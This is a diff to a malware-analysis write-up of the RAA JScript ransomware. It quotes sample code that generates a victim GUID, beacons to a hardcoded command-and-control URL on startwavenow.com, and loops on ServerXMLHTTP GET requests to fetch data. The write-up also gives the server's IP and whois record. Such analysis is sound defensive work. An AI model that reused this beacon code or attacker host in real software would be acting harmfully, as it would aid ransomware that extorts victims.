@@ -324,7 +324,32 @@ Last part of the function checks if there are currently running **wscript.exe** 
 
 Last part of the code contains two functions, **HxBG()** and **izzU()**
 
-First, let's take a look at **izzU()**. First thing is to initialize **KrvABjTTXNS** array with values get from remote server. Function **get_HZtSmFNRdJM()**, which is responsible for this part, contains hardcoded url, with **id** argument passed via GET:
+First, let's take a look at **izzU()**. 
+
+It starts from generating GUID, from within string contains 36 chars is cut and assigned to **cVjZujcP**. This value is used later.
+
+```
+Globally Unique Identifier or GUID is a 128-bit integer (16 bytes) 
+that is used by some software applications across all computers and 
+networks in order to provide a reference number which is unique or 
+to identify a particular component. Because of this there's a very 
+low probability that any two or more component has the same value.
+
+GUID is also used in Windows Registry.
+
+More info:
+https://msdn.microsoft.com/en-us/library/windows/desktop/aa373931(v=vs.85).aspx
+
+```
+
+Here's the code which generates GUID:
+
+```javascript
+ var FknDierotSzK = new ActiveXObject("Scriptlet.TypeLib");
+ var cVjZujcP = FknDierotSzK.GUID.substr(1, 36);
+```
+
+Next thing is to initialize **KrvABjTTXNS** array with values get from remote server. Function **get_HZtSmFNRdJM()**, which is responsible for this part, contains hardcoded url, with **id** argument passed via GET:
 
 ```javascript
 var VuSD = cVjZujcP + " - RAA";
@@ -332,7 +357,9 @@ var MOSKn = [];
 MOSKn[0] = "http://startwavenow.com/cmh" + "/mars.php?id=" + VuSD;
 ```
 
-Server IP address (188.40.248.65) is a part of a network located in Germany (?), registered by 
+Server IP address (188.40.248.65) is a part of a network located in Germany (?), owned by Romanian hosting company THC Projects. Those information were valid on 14.07.2016, when this part of my writeup was created.
+
+
 ```
 
 % Abuse contact for '188.40.248.64 - 188.40.248.95' is 'abuse@hetzner.de'
@@ -363,9 +390,44 @@ last-modified:  2014-11-30T13:42:54Z
 source:         RIPE # Filtered
 ```
 
-```javascript
+Let's go back to the code.
 
+I could not check what server returns, because this particular account was suspended. In next line, ServerXMLHTTP server is created to communicate with remote machine. Next couple of lines set timeouts for **req** object (see https://msdn.microsoft.com/en-us/library/ms760403(v=vs.85).aspx for details):
+
+```javascript
+var req = new ActiveXObject("Msxml2.ServerXMLHTTP.6.0");
+var QSJCTxMMl = 15000;
+var bFPwcaPNy = 15000;
+var zarI = 15000;
+var olWVonsDzH = 15000;
+req.setTimeouts(QSJCTxMMl, bFPwcaPNy, zarI, olWVonsDzH);
 ```
+
+Following code uses GET method to receive some data from remote machine:
+
+```javascript
+var pointer_MOSKn = -1;
+var aka;
+do {
+    pointer_MOSKn += 1;
+    if (pointer_MOSKn <= 0) {
+        pointer_MOSKn = pointer_MOSKn;
+    } else {
+        pointer_MOSKn = 0;
+        WScript.Sleep(60000);
+    }
+    try {
+        req.open("GET", MOSKn[pointer_MOSKn], false);
+        req.send();
+        aka = req.responseText.split(',');
+    } catch (e) {
+        aka = 0;
+    }
+} while (aka == 0);
+return aka;
+```
+
+Do loop above executes as long as **aka** will not equal to 0. 
 
 
 
